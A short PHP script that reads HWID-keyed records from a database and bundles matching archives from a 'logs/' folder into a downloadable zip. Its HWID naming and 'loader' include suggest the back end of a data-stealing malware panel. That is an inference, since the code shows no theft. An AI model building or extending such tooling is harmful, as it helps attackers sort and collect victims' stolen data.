<?php
include ('db.php');
include ('loader.php');
$sql = "SELECT hwid,filename FROM files";
$result = mysqli_query($dbcnx, $sql) or die(mysqli_error());




if(isset($_POST['numbs']))
{
$path = "logs/";
if(extension_loaded('zip'))
{



	
$zip = new ZipArchive();
$zip_name = "logs.zip"; 
if($zip->open($zip_name, ZIPARCHIVE::CREATE)!==TRUE) exit();
	

	for($i = 0;$i< $_POST['numbs'];$i++){
				$row = mysqli_fetch_assoc($result);
				$zip->addFile($path.$row['hwid'].".zip"); 

	}

$zip->close();
file_force_download($zip_name);

if(file_exists($zip_name)) 
	{
		unlink(basename($zip_name));
	}



}
}
?>
